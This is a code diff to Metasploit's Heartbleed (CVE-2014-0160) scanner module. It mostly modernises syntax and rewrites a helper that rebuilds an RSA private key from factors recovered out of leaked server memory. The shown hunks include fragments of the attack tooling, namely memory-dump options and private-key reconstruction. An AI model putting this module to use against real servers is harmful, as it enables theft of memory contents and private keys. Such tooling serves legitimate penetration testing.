@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -9,10 +9,7 @@
 # TODO: Parse the rest of the server responses and return a hash with the data
 # TODO: Extract the relevant functions and include them in the framework
 
-require 'msf/core'
-
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::Tcp
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
@@ -132,13 +129,14 @@ class MetasploitModule < Msf::Auxiliary
       ],
       'References'     =>
         [
-          ['CVE', '2014-0160'],
-          ['US-CERT-VU', '720951'],
-          ['URL', 'https://www.us-cert.gov/ncas/alerts/TA14-098A'],
-          ['URL', 'http://heartbleed.com/'],
-          ['URL', 'https://github.com/FiloSottile/Heartbleed'],
-          ['URL', 'https://gist.github.com/takeshixx/10107280'],
-          ['URL', 'http://filippo.io/Heartbleed/']
+          [ 'AKA', 'Heartbleed' ],
+          [ 'CVE', '2014-0160' ],
+          [ 'US-CERT-VU', '720951' ],
+          [ 'URL', 'https://www.us-cert.gov/ncas/alerts/TA14-098A' ],
+          [ 'URL', 'http://heartbleed.com/' ],
+          [ 'URL', 'https://github.com/FiloSottile/Heartbleed' ],
+          [ 'URL', 'https://gist.github.com/takeshixx/10107280' ],
+          [ 'URL', 'http://filippo.io/Heartbleed/' ]
         ],
       'DisclosureDate' => 'Apr 7 2014',
       'License'        => MSF_LICENSE,
@@ -160,13 +158,13 @@ class MetasploitModule < Msf::Auxiliary
         OptInt.new('STATUS_EVERY', [true, 'How many retries until status', 5]),
         OptRegexp.new('DUMPFILTER', [false, 'Pattern to filter leaked memory before storing', nil]),
         OptInt.new('RESPONSE_TIMEOUT', [true, 'Number of seconds to wait for a server response', 10])
-      ], self.class)
+      ])
 
     register_advanced_options(
       [
         OptInt.new('HEARTBEAT_LENGTH', [true, 'Heartbeat length', 65535]),
         OptString.new('XMPPDOMAIN', [true, 'The XMPP Domain to use when Jabber is selected', 'localhost'])
-      ], self.class)
+      ])
 
   end
 
@@ -519,7 +517,7 @@ class MetasploitModule < Msf::Auxiliary
         nil,
         'OpenSSL Heartbleed server memory'
       )
-      print_status("Heartbeat data stored in #{path}")
+      print_good("Heartbeat data stored in #{path}")
     end
 
     # Convert non-printable characters to periods
@@ -632,19 +630,19 @@ class MetasploitModule < Msf::Auxiliary
   def key_from_pqe(p, q, e)
     # Returns an RSA Private Key from Factors
     key = OpenSSL::PKey::RSA.new()
+    key.set_factors(p, q)
 
-    key.p = p
-    key.q = q
-
-    key.n = key.p*key.q
-    key.e = e
-
+    n = key.p * key.q
     phi = (key.p - 1) * (key.q - 1 )
-    key.d = key.e.mod_inverse(phi)
+    d = OpenSSL::BN.new(e).mod_inverse(phi)
 
-    key.dmp1 = key.d % (key.p - 1)
-    key.dmq1 = key.d % (key.q - 1)
-    key.iqmp = key.q.mod_inverse(key.p)
+    key.set_key(n, e, d)
+
+    dmp1 = key.d % (key.p - 1)
+    dmq1 = key.d % (key.q - 1)
+    iqmp = key.q.mod_inverse(key.p)
+
+    key.set_crt_params(dmp1, dmq1, iqmp)
 
     return key
   end
@@ -837,5 +835,4 @@ class MetasploitModule < Msf::Auxiliary
     # TODO: return hash with data
     true
   end
-
 end
